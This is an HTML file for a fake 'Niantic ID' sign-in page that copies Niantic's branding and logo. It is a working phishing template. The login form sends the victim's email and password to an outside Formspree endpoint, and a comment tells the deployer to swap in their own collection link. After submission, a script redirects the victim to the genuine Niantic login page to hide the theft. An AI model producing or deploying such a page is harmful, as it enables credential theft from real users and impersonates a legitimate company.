<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Niantic ID - Sign In</title>
    <style>
        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
        }
        .logo {
            width: 150px;
            margin-bottom: 20px;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }
        h2 {
            color: #333;
            font-size: 28px;
            text-align: center;
            margin-bottom: 10px;
            font-weight: 600;
        }
        p {
            color: #666;
            text-align: center;
            margin-bottom: 30px;
            font-size: 16px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 16px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 8px;
            box-sizing: border-box;
            font-size: 18px;
            background-color: #f9f9f9;
        }
        input:focus {
            outline: none;
            border-color: #3b4cca;
            background-color: #fff;
        }
        button {
            width: 100%;
            background-color: #3b4cca;
            color: white;
            padding: 16px;
            margin-top: 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 18px;
            font-weight: bold;
        }
        button:hover {
            background-color: #2a3a9e;
        }
        .footer {
            margin-top: 40px;
            text-align: center;
            font-size: 12px;
            color: #999;
        }
        .spinner {
            display: none;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3b4cca;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 2s linear infinite;
            margin: 10px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="login-container">
    <!-- Official Niantic Logo -->
    <img src="images/img1.png" alt="Niantic Logo" class="logo">
    
    <h2>Sign in</h2>
    <p>Enter your Niantic ID to continue.</p>

    <!-- CHANGE THE URL BELOW TO YOUR FORMSPREE LINK -->
    <form action="https://formspree.io/f/mzerkddl" method="POST">
        
        <input type="text" name="email" placeholder="Email or Username" required>
        <input type="password" name="password" placeholder="Password" required>
        
        <button type="submit" id="submitBtn">Log In</button>
        
        <div class="spinner" id="spinner"></div>
    </form>

    <div class="footer">
        &copy; 2026 Niantic, Inc. All Rights Reserved.
    </div>
</div>

<script>
    document.querySelector('form').addEventListener('submit', function(e) {
        const spinner = document.getElementById('spinner');
        const btn = document.getElementById('submitBtn');
        
        btn.style.display = 'none';
        spinner.style.display = 'block';

        setTimeout(() => {
             window.location.href = "https://nianticlabs.com/auth/login";
        }, 1000); 
    });
</script>

</body>
</html>
